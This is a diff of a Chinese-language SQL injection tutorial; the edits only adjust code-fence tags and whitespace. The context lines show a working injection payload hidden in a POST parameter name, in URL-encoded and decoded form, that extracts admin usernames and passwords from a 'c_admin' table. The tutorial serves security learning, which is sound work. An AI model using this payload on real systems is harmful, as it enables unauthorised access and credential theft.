@@ -20,7 +20,7 @@ tags:
 
 有时候可能会在奇奇怪怪的地方可以注入，如post变量名可能出现如下，有点像字典一样的变量：
 
-```http
+```
 POST / HTTP 1.0
 ...
 ...
@@ -30,7 +30,7 @@ fields[truename]=Bob
 
 或者
 
-```http
+```
 POST / HTTP 1.0
 ...
 ...
@@ -48,7 +48,7 @@ fields%5Btruename%5D=Bob
 
 把上面这一段放在fields%5Btruename%5D的%5D前面，也就是如下
 
-```http
+```
 POST / HTTP 1.0
 ...
 ...
@@ -56,7 +56,7 @@ POST / HTTP 1.0
 fields%5Btruename%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23%5D
 ```
 自行解一下码方便看，如下：
-```http
+```
 POST / HTTP 1.0
 ...
 ...
@@ -67,7 +67,7 @@ fields[truename`=(select group_concat(username,0x3a,password) from c_admin where
 
 
 
-## 0x02 搜索型注入
+## 0x02 搜索型注入 
 
 - like
 - 通配符 \*
